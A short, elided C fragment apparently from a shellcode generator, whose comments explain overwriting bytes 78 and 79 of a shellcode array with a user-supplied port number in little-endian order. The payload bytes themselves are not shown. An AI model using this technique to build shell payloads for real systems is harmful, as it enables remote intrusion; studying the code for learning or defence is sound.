...
int main(int argc, char *argv[]){
	if(argc<2)
		...
		*/
		...
		/*
			At an offset of 78 and 79 in the shellcode the values of the port number is stored in little endian format as  \x23\x28
			So our target is always to overwrite  these values with the new values of the port number we received as input
		*/

		shellcode[78]=a;// Little endian : So last 2 goes first
		shellcode[79]=b;// Little endian : So first 2 goes next
